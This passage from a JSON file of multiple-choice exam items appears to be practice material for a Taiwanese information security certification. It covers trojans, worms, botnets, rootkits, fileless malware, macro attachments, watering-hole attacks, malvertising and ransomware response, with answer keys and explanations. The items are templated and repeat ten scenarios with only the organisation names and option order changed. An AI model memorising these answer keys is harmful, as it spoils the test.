    "question": "某知名大型網路電商平台一名工程師從不明論壇下載號稱「免費正版繪圖軟體破解版」，安裝後軟體雖看似可正常運作，但系統後台卻被靜默植入隱蔽服務，每晚定期向境外主機傳送螢幕截圖。此惡意程式屬於：",
    "options": [
      "A. 邏輯炸彈（Logic Bomb）",
      "B. 特洛伊木馬（Trojan Horse）",
      "C. 電腦蠕蟲（Worm）",
      "D. 網站漏洞（SQL Injection）"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "Trojan",
        "zh": "特洛伊木馬",
        "ipa": "/ˈtroʊ.dʒən/"
      },
      {
        "en": "Worm",
        "zh": "電腦蠕蟲",
        "ipa": "/wɝːm/"
      },
      {
        "en": "SQL Injection",
        "zh": "SQL 注入攻擊",
        "ipa": "/ˌes.kjuːˈel ɪnˈdʒek.ʃən/"
      }
    ],
    "explanation": "偽裝成正常合法軟體，誘騙使用者自行安裝，背後執行惡意後門行為，即為特洛伊木馬之經典定義。",
    "trap": "木馬不具備自主網路掃描自我繁殖能力，多靠偽裝誘導安裝。",
    "law": "MITRE ATT&CK T1204"
  },
  {
    "id": "IPAS-B-303",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠內部網段中有一台老舊伺服器未安裝最新安全補丁，突然在 10 分鐘內，同網段超過 80 台 Windows 電腦全數感染同種惡意程式，且並無任何員工點擊釣魚信。此惡意程式最可能具備下列何種特性？",
    "options": [
      "A. 勒索軟體必須由黑客人工手動逐台輸入密碼",
      "B. 巨集病毒必須由使用者手動開啟檔案",
      "C. 跨網站腳本必須由瀏覽器觸發",
      "D. 電腦蠕蟲（Worm）具備自主掃描網路漏洞並自我傳播的能力"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "Worm",
        "zh": "電腦蠕蟲",
        "ipa": "/wɝːm/"
      }
    ],
    "explanation": "蠕蟲（如 WannaCry）不需人為點擊介入，利用未修補之網路協定弱點（如 SMB）即能自體高速橫向擴散感染。",
    "trap": "能在短時間內無感感染整片網段者通常為蠕蟲行為。",
    "law": "CERT 資安威脅分類手冊"
  },
  {
    "id": "IPAS-B-304",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某國際航運物流貨櫃集團監控設備發現內部數百台 IoT 智慧監視器半夜產生異常巨量 UDP 流量衝擊境外某金融網站，經查此批設備預設密碼未改遭黑客入侵並納入控制。這些受控設備在資安術語中被稱為：",
    "options": [
      "A. 代理伺服器（Proxy）",
      "B. 蜜罐（Honeypot）",
      "C. 殭屍節點（Botnet / Bots）",
      "D. 負載平衡器（Load Balancer）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "DDoS",
        "zh": "分散式阻斷服務攻擊",
        "ipa": "/ˌdiːˈdɑːs/"
      },
      {
        "en": "Botnet",
        "zh": "殭屍網路",
        "ipa": "/ˈbɑːt.net/"
      }
    ],
    "explanation": "受黑客植入後門並受控於 C2 伺服器進行分散式阻斷服務（DDoS）攻擊的主機或 IoT 設備稱為 Botnet（殭屍網路）。",
    "trap": "弱密碼或未打補丁的 IoT 設備是現代 Botnet 的主要溫床。",
    "law": "OWASP IoT Top 10"
  },
  {
    "id": "IPAS-B-305",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心資安鑑識工程師在排查一台疑似遭進階滲透的主機時，發現使用一般工作管理員完全看不到可疑進程，但網路連線卻持續向外傳輸機密。攻擊者最可能植入了何種技術以隱藏其行蹤？",
    "options": [
      "A. 勒索軟體（Ransomware）",
      "B. 廣告軟體（Adware）",
      "C. Rootkit（管理者工具包 / 隱匿工具）",
      "D. 鍵盤側錄器（Keylogger）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "Ransomware",
        "zh": "勒索軟體",
        "ipa": "/ˈræn.səm.wer/"
      },
      {
        "en": "Rootkit",
        "zh": "管理者工具包 / 隱匿木馬",
        "ipa": "/ˈruːt.kɪt/"
      }
    ],
    "explanation": "Rootkit 往往深入作業系統核心層（Kernel mode），攔截並竄改系統 API（Hooking），使一般管理工具隱形無法顯示該惡意進程。",
    "trap": "防禦需依賴安全開機（Secure Boot）與底層 EDR 偵測。",
    "law": "MITRE ATT&CK T1014"
  },
  {
    "id": "IPAS-B-306",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某跨國金融控股銀行資安監控中心（SOC）偵測到某端點電腦的 PowerShell 正在記憶體中載入 Base64 編碼的惡意代碼，但主機硬碟掃描卻完全未發現任何實體惡意檔案落盤。此型態攻擊稱為：",
    "options": [
      "A. 網路釣魚攻擊",
      "B. 無檔案惡意程式（Fileless Malware）",
      "C. 磁碟壞軌故障",
      "D. 傳統開機區引導病毒"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "無檔案惡意程式不將實體 exe 寫入硬碟，而是寄生於合法系統工具（如 PowerShell, WMI）在 RAM 記憶體中執行，藉以規避傳統防毒軟體靜態特徵碼檢查。",
    "trap": "防範此威脅必須仰賴端點 EDR 之動態行為監控。",
    "law": "MITRE ATT&CK Living Off The Land"
  },
  {
    "id": "IPAS-B-307",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某高科技晶圓代工大廠人資部門同仁收到一封自稱是某國立大學應徵實習生的求職信，信件內附帶名為「履歷表.docx」之檔案，開啟後提示「請啟用巨集以檢視完整排版」。同仁應如何處置？",
    "options": [
      "A. 立即點擊啟用巨集以確認真實姓名",
      "B. 忽略警告直接填寫個人資料",
      "C. 絕對不點擊啟用巨集，並立即通報資安團隊進行沙箱檢測與阻絕",
      "D. 將檔案轉寄給全公司同仁幫忙確認"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "求職信附件夾帶 Office 文件並提示啟用巨集，為最常見之惡意載具投放手法，啟用巨集即等於同意執行惡意 VBA 代碼。",
    "trap": "企業應預設禁用來自網路之 Office 巨集。",
    "law": "CISA 惡意巨集防護指南"
  },
  {
    "id": "IPAS-B-308",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某國立頂尖研究型大學資安團隊發現研發工程師常造訪的一個專業晶片論壇網站遭黑客植入惡意腳本，任何前往該論壇瀏覽的同仁若瀏覽器未打補丁便會被自動下載後門。此攻擊手法屬於：",
    "options": [
      "A. 實體尾隨入侵",
      "B. 字典檔暴力破解攻擊",
      "C. 水坑攻擊（Watering Hole Attack）",
      "D. 阻斷服務攻擊（DDoS）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "Watering Hole",
        "zh": "水坑攻擊",
        "ipa": "/ˈwɑː.t̬ɚ.ɪŋ hoʊl/"
      },
      {
        "en": "DDoS",
        "zh": "分散式阻斷服務攻擊",
        "ipa": "/ˌdiːˈdɑːs/"
      }
    ],
    "explanation": "水坑攻擊如同獵人在動物飲水的水坑埋伏，黑客預先攻陷目標群體常訪的合法垂直領域網站，伺機攻擊造訪者。",
    "trap": "防護重點在於端點瀏覽器與作業系統隨時修補最新補丁。",
    "law": "MITRE ATT&CK T1189"
  },
  {
    "id": "IPAS-B-309",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某國立頂尖研究型大學為全面杜絕微軟 Office 巨集病毒（Macro Virus）肆虐，IT 部門應透過群組原則（GPO）採取何項最佳配置？",
    "options": [
      "A. 僅要求同仁自行辨識信箱來源",
      "B. 停用 Windows Update",
      "C. 強制停用所有來自網際網路下載之 Office 檔案中的巨集執行（Block macros from running）",
      "D. 開放所有巨集無需提醒"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "微軟最新政策與最佳實務均為：透過 GPO 封鎖所有自外網標籤（Mark of the Web, MOTW）下載檔案之巨集執行。",
    "trap": "行政宣導效果有限，必須從作業系統原則予以強制禁用。",
    "law": "微軟 Office 安全組態指南"
  },
  {
    "id": "IPAS-B-310",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某區域教學醫學中心資安通報顯示某攻擊者入侵了知名新聞媒體網站的第三方廣告聯播系統，使訪客在瀏覽正常新聞時被無感重定向至掛馬網站。此攻擊手法稱為：",
    "options": [
      "A. 網路釣魚（Phishing）",
      "B. 社交工程（Social Engineering）",
      "C. 中間人攻擊（MitM）",
      "D. 惡意廣告攻擊（Malvertising）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "Phishing",
        "zh": "網路釣魚",
        "ipa": "/ˈfɪʃ.ɪŋ/"
      },
      {
        "en": "MitM",
        "zh": "中間人攻擊",
        "ipa": "/mæn ɪn ðə ˈmɪd.əl/"
      }
    ],
    "explanation": "利用合法廣告網路投放夾帶惡意跳轉或漏洞攻擊代碼之廣告，稱為 Malvertising。",
    "trap": "使用者並未造訪非法網站，僅瀏覽正常新聞即受害，常結合瀏覽器零日漏洞。",
    "law": "ENISA 威脅情勢報告"
  },
  {
    "id": "IPAS-B-311",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某區域教學醫學中心多位員工今晨開機發現桌面背景被置換為勒索信，且個人電腦中的 Office 與 PDF 檔案副檔名全被竄改為未知字串無法讀取。資安人員到場第一步最應執行的緊急應變措施為：",
    "options": [
      "A. 立即重新啟動電腦嘗試修復",
      "B. 立即將備份硬碟插上受害電腦進行還原",
      "C. 立即將受害電腦之實體網路線拔除（或中斷無線網路連線），執行緊急網路隔離",
      "D. 立即點擊勒索信中的比特幣連結付款"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "遭遇勒索軟體，第一優先任務是『隔離遏止』，立即拔除網路線防止惡意程式在內網持續橫向擴散。",
    "trap": "重開機會抹除記憶體證據，直接插上備份碟會導致備份資料連帶遭勒索軟體加密！",
    "law": "NIST SP 800-61 事件應變指南"
  },
  {
    "id": "IPAS-B-312",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某公務機關資訊處一名工程師從不明論壇下載號稱「免費正版繪圖軟體破解版」，安裝後軟體雖看似可正常運作，但系統後台卻被靜默植入隱蔽服務，每晚定期向境外主機傳送螢幕截圖。此惡意程式屬於：",
    "options": [
      "A. 電腦蠕蟲（Worm）",
      "B. 邏輯炸彈（Logic Bomb）",
      "C. 網站漏洞（SQL Injection）",
      "D. 特洛伊木馬（Trojan Horse）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "Trojan",
        "zh": "特洛伊木馬",
        "ipa": "/ˈtroʊ.dʒən/"
      },
      {
        "en": "Worm",
        "zh": "電腦蠕蟲",
        "ipa": "/wɝːm/"
      },
      {
        "en": "SQL Injection",
        "zh": "SQL 注入攻擊",
        "ipa": "/ˌes.kjuːˈel ɪnˈdʒek.ʃən/"
      }
    ],
    "explanation": "偽裝成正常合法軟體，誘騙使用者自行安裝，背後執行惡意後門行為，即為特洛伊木馬之經典定義。",
    "trap": "木馬不具備自主網路掃描自我繁殖能力，多靠偽裝誘導安裝。",
    "law": "MITRE ATT&CK T1204"
  },
  {
    "id": "IPAS-B-313",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠內部網段中有一台老舊伺服器未安裝最新安全補丁，突然在 10 分鐘內，同網段超過 80 台 Windows 電腦全數感染同種惡意程式，且並無任何員工點擊釣魚信。此惡意程式最可能具備下列何種特性？",
    "options": [
      "A. 電腦蠕蟲（Worm）具備自主掃描網路漏洞並自我傳播的能力",
      "B. 勒索軟體必須由黑客人工手動逐台輸入密碼",
      "C. 跨網站腳本必須由瀏覽器觸發",
      "D. 巨集病毒必須由使用者手動開啟檔案"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "Worm",
        "zh": "電腦蠕蟲",
        "ipa": "/wɝːm/"
      }
    ],
    "explanation": "蠕蟲（如 WannaCry）不需人為點擊介入，利用未修補之網路協定弱點（如 SMB）即能自體高速橫向擴散感染。",
    "trap": "能在短時間內無感感染整片網段者通常為蠕蟲行為。",
    "law": "CERT 資安威脅分類手冊"
  },
  {
    "id": "IPAS-B-314",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某高科技晶圓代工大廠監控設備發現內部數百台 IoT 智慧監視器半夜產生異常巨量 UDP 流量衝擊境外某金融網站，經查此批設備預設密碼未改遭黑客入侵並納入控制。這些受控設備在資安術語中被稱為：",
    "options": [
      "A. 負載平衡器（Load Balancer）",
      "B. 殭屍節點（Botnet / Bots）",
      "C. 代理伺服器（Proxy）",
      "D. 蜜罐（Honeypot）"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "DDoS",
        "zh": "分散式阻斷服務攻擊",
        "ipa": "/ˌdiːˈdɑːs/"
      },
      {
        "en": "Botnet",
        "zh": "殭屍網路",
        "ipa": "/ˈbɑːt.net/"
      }
    ],
    "explanation": "受黑客植入後門並受控於 C2 伺服器進行分散式阻斷服務（DDoS）攻擊的主機或 IoT 設備稱為 Botnet（殭屍網路）。",
    "trap": "弱密碼或未打補丁的 IoT 設備是現代 Botnet 的主要溫床。",
    "law": "OWASP IoT Top 10"
  },
  {
    "id": "IPAS-B-315",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某區域教學醫學中心資安鑑識工程師在排查一台疑似遭進階滲透的主機時，發現使用一般工作管理員完全看不到可疑進程，但網路連線卻持續向外傳輸機密。攻擊者最可能植入了何種技術以隱藏其行蹤？",
    "options": [
      "A. 鍵盤側錄器（Keylogger）",
      "B. Rootkit（管理者工具包 / 隱匿工具）",
      "C. 勒索軟體（Ransomware）",
      "D. 廣告軟體（Adware）"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "Ransomware",
        "zh": "勒索軟體",
        "ipa": "/ˈræn.səm.wer/"
      },
      {
        "en": "Rootkit",
        "zh": "管理者工具包 / 隱匿木馬",
        "ipa": "/ˈruːt.kɪt/"
      }
    ],
    "explanation": "Rootkit 往往深入作業系統核心層（Kernel mode），攔截並竄改系統 API（Hooking），使一般管理工具隱形無法顯示該惡意進程。",
    "trap": "防禦需依賴安全開機（Secure Boot）與底層 EDR 偵測。",
    "law": "MITRE ATT&CK T1014"
  },
  {
    "id": "IPAS-B-316",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某雲端SaaS軟體服務供應商資安監控中心（SOC）偵測到某端點電腦的 PowerShell 正在記憶體中載入 Base64 編碼的惡意代碼，但主機硬碟掃描卻完全未發現任何實體惡意檔案落盤。此型態攻擊稱為：",
    "options": [
      "A. 網路釣魚攻擊",
      "B. 磁碟壞軌故障",
      "C. 傳統開機區引導病毒",
      "D. 無檔案惡意程式（Fileless Malware）"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "無檔案惡意程式不將實體 exe 寫入硬碟，而是寄生於合法系統工具（如 PowerShell, WMI）在 RAM 記憶體中執行，藉以規避傳統防毒軟體靜態特徵碼檢查。",
    "trap": "防範此威脅必須仰賴端點 EDR 之動態行為監控。",
    "law": "MITRE ATT&CK Living Off The Land"
  },
  {
    "id": "IPAS-B-317",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠人資部門同仁收到一封自稱是某國立大學應徵實習生的求職信，信件內附帶名為「履歷表.docx」之檔案，開啟後提示「請啟用巨集以檢視完整排版」。同仁應如何處置？",
    "options": [
      "A. 將檔案轉寄給全公司同仁幫忙確認",
      "B. 忽略警告直接填寫個人資料",
      "C. 立即點擊啟用巨集以確認真實姓名",
      "D. 絕對不點擊啟用巨集，並立即通報資安團隊進行沙箱檢測與阻絕"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "求職信附件夾帶 Office 文件並提示啟用巨集，為最常見之惡意載具投放手法，啟用巨集即等於同意執行惡意 VBA 代碼。",
    "trap": "企業應預設禁用來自網路之 Office 巨集。",
    "law": "CISA 惡意巨集防護指南"
  },
  {
    "id": "IPAS-B-318",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某國立頂尖研究型大學資安團隊發現研發工程師常造訪的一個專業晶片論壇網站遭黑客植入惡意腳本，任何前往該論壇瀏覽的同仁若瀏覽器未打補丁便會被自動下載後門。此攻擊手法屬於：",
    "options": [
      "A. 實體尾隨入侵",
      "B. 阻斷服務攻擊（DDoS）",
      "C. 字典檔暴力破解攻擊",
      "D. 水坑攻擊（Watering Hole Attack）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "Watering Hole",
        "zh": "水坑攻擊",
        "ipa": "/ˈwɑː.t̬ɚ.ɪŋ hoʊl/"
      },
      {
        "en": "DDoS",
        "zh": "分散式阻斷服務攻擊",
        "ipa": "/ˌdiːˈdɑːs/"
      }
    ],
    "explanation": "水坑攻擊如同獵人在動物飲水的水坑埋伏，黑客預先攻陷目標群體常訪的合法垂直領域網站，伺機攻擊造訪者。",
    "trap": "防護重點在於端點瀏覽器與作業系統隨時修補最新補丁。",
    "law": "MITRE ATT&CK T1189"
  },
  {
    "id": "IPAS-B-319",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某金流與行動支付科技公司為全面杜絕微軟 Office 巨集病毒（Macro Virus）肆虐，IT 部門應透過群組原則（GPO）採取何項最佳配置？",
    "options": [
      "A. 僅要求同仁自行辨識信箱來源",
      "B. 開放所有巨集無需提醒",
      "C. 停用 Windows Update",
      "D. 強制停用所有來自網際網路下載之 Office 檔案中的巨集執行（Block macros from running）"
    ],
    "answer": "D",
    "terms": [],
    "explanation": "微軟最新政策與最佳實務均為：透過 GPO 封鎖所有自外網標籤（Mark of the Web, MOTW）下載檔案之巨集執行。",
    "trap": "行政宣導效果有限，必須從作業系統原則予以強制禁用。",
    "law": "微軟 Office 安全組態指南"
  },
  {
    "id": "IPAS-B-320",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某大型連鎖量販流通集團資安通報顯示某攻擊者入侵了知名新聞媒體網站的第三方廣告聯播系統，使訪客在瀏覽正常新聞時被無感重定向至掛馬網站。此攻擊手法稱為：",
    "options": [
      "A. 中間人攻擊（MitM）",
      "B. 惡意廣告攻擊（Malvertising）",
      "C. 網路釣魚（Phishing）",
      "D. 社交工程（Social Engineering）"
    ],
    "answer": "B",
    "terms": [
      {
        "en": "Phishing",
        "zh": "網路釣魚",
        "ipa": "/ˈfɪʃ.ɪŋ/"
      },
      {
        "en": "MitM",
        "zh": "中間人攻擊",
        "ipa": "/mæn ɪn ðə ˈmɪd.əl/"
      }
    ],
    "explanation": "利用合法廣告網路投放夾帶惡意跳轉或漏洞攻擊代碼之廣告，稱為 Malvertising。",
    "trap": "使用者並未造訪非法網站，僅瀏覽正常新聞即受害，常結合瀏覽器零日漏洞。",
    "law": "ENISA 威脅情勢報告"
  },
  {
    "id": "IPAS-B-321",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某金流與行動支付科技公司多位員工今晨開機發現桌面背景被置換為勒索信，且個人電腦中的 Office 與 PDF 檔案副檔名全被竄改為未知字串無法讀取。資安人員到場第一步最應執行的緊急應變措施為：",
    "options": [
      "A. 立即重新啟動電腦嘗試修復",
      "B. 立即點擊勒索信中的比特幣連結付款",
      "C. 立即將受害電腦之實體網路線拔除（或中斷無線網路連線），執行緊急網路隔離",
      "D. 立即將備份硬碟插上受害電腦進行還原"
    ],
    "answer": "C",
    "terms": [],
    "explanation": "遭遇勒索軟體，第一優先任務是『隔離遏止』，立即拔除網路線防止惡意程式在內網持續橫向擴散。",
    "trap": "重開機會抹除記憶體證據，直接插上備份碟會導致備份資料連帶遭勒索軟體加密！",
    "law": "NIST SP 800-61 事件應變指南"
  },
  {
    "id": "IPAS-B-322",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠一名工程師從不明論壇下載號稱「免費正版繪圖軟體破解版」，安裝後軟體雖看似可正常運作，但系統後台卻被靜默植入隱蔽服務，每晚定期向境外主機傳送螢幕截圖。此惡意程式屬於：",
    "options": [
      "A. 網站漏洞（SQL Injection）",
      "B. 邏輯炸彈（Logic Bomb）",
      "C. 特洛伊木馬（Trojan Horse）",
      "D. 電腦蠕蟲（Worm）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "Trojan",
        "zh": "特洛伊木馬",
        "ipa": "/ˈtroʊ.dʒən/"
      },
      {
        "en": "Worm",
        "zh": "電腦蠕蟲",
        "ipa": "/wɝːm/"
      },
      {
        "en": "SQL Injection",
        "zh": "SQL 注入攻擊",
        "ipa": "/ˌes.kjuːˈel ɪnˈdʒek.ʃən/"
      }
    ],
    "explanation": "偽裝成正常合法軟體，誘騙使用者自行安裝，背後執行惡意後門行為，即為特洛伊木馬之經典定義。",
    "trap": "木馬不具備自主網路掃描自我繁殖能力，多靠偽裝誘導安裝。",
    "law": "MITRE ATT&CK T1204"
  },
  {
    "id": "IPAS-B-323",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某直轄市政府智慧運籌中心內部網段中有一台老舊伺服器未安裝最新安全補丁，突然在 10 分鐘內，同網段超過 80 台 Windows 電腦全數感染同種惡意程式，且並無任何員工點擊釣魚信。此惡意程式最可能具備下列何種特性？",
    "options": [
      "A. 電腦蠕蟲（Worm）具備自主掃描網路漏洞並自我傳播的能力",
      "B. 勒索軟體必須由黑客人工手動逐台輸入密碼",
      "C. 巨集病毒必須由使用者手動開啟檔案",
      "D. 跨網站腳本必須由瀏覽器觸發"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "Worm",
        "zh": "電腦蠕蟲",
        "ipa": "/wɝːm/"
      }
    ],
    "explanation": "蠕蟲（如 WannaCry）不需人為點擊介入，利用未修補之網路協定弱點（如 SMB）即能自體高速橫向擴散感染。",
    "trap": "能在短時間內無感感染整片網段者通常為蠕蟲行為。",
    "law": "CERT 資安威脅分類手冊"
  },
  {
    "id": "IPAS-B-324",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某金流與行動支付科技公司監控設備發現內部數百台 IoT 智慧監視器半夜產生異常巨量 UDP 流量衝擊境外某金融網站，經查此批設備預設密碼未改遭黑客入侵並納入控制。這些受控設備在資安術語中被稱為：",
    "options": [
      "A. 蜜罐（Honeypot）",
      "B. 負載平衡器（Load Balancer）",
      "C. 殭屍節點（Botnet / Bots）",
      "D. 代理伺服器（Proxy）"
    ],
    "answer": "C",
    "terms": [
      {
        "en": "DDoS",
        "zh": "分散式阻斷服務攻擊",
        "ipa": "/ˌdiːˈdɑːs/"
      },
      {
        "en": "Botnet",
        "zh": "殭屍網路",
        "ipa": "/ˈbɑːt.net/"
      }
    ],
    "explanation": "受黑客植入後門並受控於 C2 伺服器進行分散式阻斷服務（DDoS）攻擊的主機或 IoT 設備稱為 Botnet（殭屍網路）。",
    "trap": "弱密碼或未打補丁的 IoT 設備是現代 Botnet 的主要溫床。",
    "law": "OWASP IoT Top 10"
  },
  {
    "id": "IPAS-B-325",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某公務機關資訊處資安鑑識工程師在排查一台疑似遭進階滲透的主機時，發現使用一般工作管理員完全看不到可疑進程，但網路連線卻持續向外傳輸機密。攻擊者最可能植入了何種技術以隱藏其行蹤？",
    "options": [
      "A. Rootkit（管理者工具包 / 隱匿工具）",
      "B. 勒索軟體（Ransomware）",
      "C. 廣告軟體（Adware）",
      "D. 鍵盤側錄器（Keylogger）"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "Ransomware",
        "zh": "勒索軟體",
        "ipa": "/ˈræn.səm.wer/"
      },
      {
        "en": "Rootkit",
        "zh": "管理者工具包 / 隱匿木馬",
        "ipa": "/ˈruːt.kɪt/"
      }
    ],
    "explanation": "Rootkit 往往深入作業系統核心層（Kernel mode），攔截並竄改系統 API（Hooking），使一般管理工具隱形無法顯示該惡意進程。",
    "trap": "防禦需依賴安全開機（Secure Boot）與底層 EDR 偵測。",
    "law": "MITRE ATT&CK T1014"
  },
  {
    "id": "IPAS-B-326",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某知名大型網路電商平台資安監控中心（SOC）偵測到某端點電腦的 PowerShell 正在記憶體中載入 Base64 編碼的惡意代碼，但主機硬碟掃描卻完全未發現任何實體惡意檔案落盤。此型態攻擊稱為：",
    "options": [
      "A. 無檔案惡意程式（Fileless Malware）",
      "B. 磁碟壞軌故障",
      "C. 傳統開機區引導病毒",
      "D. 網路釣魚攻擊"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "無檔案惡意程式不將實體 exe 寫入硬碟，而是寄生於合法系統工具（如 PowerShell, WMI）在 RAM 記憶體中執行，藉以規避傳統防毒軟體靜態特徵碼檢查。",
    "trap": "防範此威脅必須仰賴端點 EDR 之動態行為監控。",
    "law": "MITRE ATT&CK Living Off The Land"
  },
  {
    "id": "IPAS-B-327",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某大型連鎖量販流通集團人資部門同仁收到一封自稱是某國立大學應徵實習生的求職信，信件內附帶名為「履歷表.docx」之檔案，開啟後提示「請啟用巨集以檢視完整排版」。同仁應如何處置？",
    "options": [
      "A. 立即點擊啟用巨集以確認真實姓名",
      "B. 絕對不點擊啟用巨集，並立即通報資安團隊進行沙箱檢測與阻絕",
      "C. 將檔案轉寄給全公司同仁幫忙確認",
      "D. 忽略警告直接填寫個人資料"
    ],
    "answer": "B",
    "terms": [],
    "explanation": "求職信附件夾帶 Office 文件並提示啟用巨集，為最常見之惡意載具投放手法，啟用巨集即等於同意執行惡意 VBA 代碼。",
    "trap": "企業應預設禁用來自網路之 Office 巨集。",
    "law": "CISA 惡意巨集防護指南"
  },
  {
    "id": "IPAS-B-328",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠資安團隊發現研發工程師常造訪的一個專業晶片論壇網站遭黑客植入惡意腳本，任何前往該論壇瀏覽的同仁若瀏覽器未打補丁便會被自動下載後門。此攻擊手法屬於：",
    "options": [
      "A. 水坑攻擊（Watering Hole Attack）",
      "B. 字典檔暴力破解攻擊",
      "C. 阻斷服務攻擊（DDoS）",
      "D. 實體尾隨入侵"
    ],
    "answer": "A",
    "terms": [
      {
        "en": "Watering Hole",
        "zh": "水坑攻擊",
        "ipa": "/ˈwɑː.t̬ɚ.ɪŋ hoʊl/"
      },
      {
        "en": "DDoS",
        "zh": "分散式阻斷服務攻擊",
        "ipa": "/ˌdiːˈdɑːs/"
      }
    ],
    "explanation": "水坑攻擊如同獵人在動物飲水的水坑埋伏，黑客預先攻陷目標群體常訪的合法垂直領域網站，伺機攻擊造訪者。",
    "trap": "防護重點在於端點瀏覽器與作業系統隨時修補最新補丁。",
    "law": "MITRE ATT&CK T1189"
  },
  {
    "id": "IPAS-B-329",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某關鍵基礎設施發電廠為全面杜絕微軟 Office 巨集病毒（Macro Virus）肆虐，IT 部門應透過群組原則（GPO）採取何項最佳配置？",
    "options": [
      "A. 強制停用所有來自網際網路下載之 Office 檔案中的巨集執行（Block macros from running）",
      "B. 停用 Windows Update",
      "C. 僅要求同仁自行辨識信箱來源",
      "D. 開放所有巨集無需提醒"
    ],
    "answer": "A",
    "terms": [],
    "explanation": "微軟最新政策與最佳實務均為：透過 GPO 封鎖所有自外網標籤（Mark of the Web, MOTW）下載檔案之巨集執行。",
    "trap": "行政宣導效果有限，必須從作業系統原則予以強制禁用。",
    "law": "微軟 Office 安全組態指南"
  },
  {
    "id": "IPAS-B-330",
    "level": "初級",
    "subject": "考科一：資訊安全概論",
    "domain": "惡意程式分析與常見威脅情境",
    "scenario": true,
    "question": "某跨國金融控股銀行資安通報顯示某攻擊者入侵了知名新聞媒體網站的第三方廣告聯播系統，使訪客在瀏覽正常新聞時被無感重定向至掛馬網站。此攻擊手法稱為：",
    "options": [
      "A. 中間人攻擊（MitM）",
      "B. 網路釣魚（Phishing）",
      "C. 社交工程（Social Engineering）",
      "D. 惡意廣告攻擊（Malvertising）"
    ],
    "answer": "D",
    "terms": [
      {
        "en": "Phishing",
        "zh": "網路釣魚",
        "ipa": "/ˈfɪʃ.ɪŋ/"
      },
      {
        "en": "MitM",
        "zh": "中間人攻擊",
        "ipa": "/mæn ɪn ðə ˈmɪd.əl/"
      }
    ],
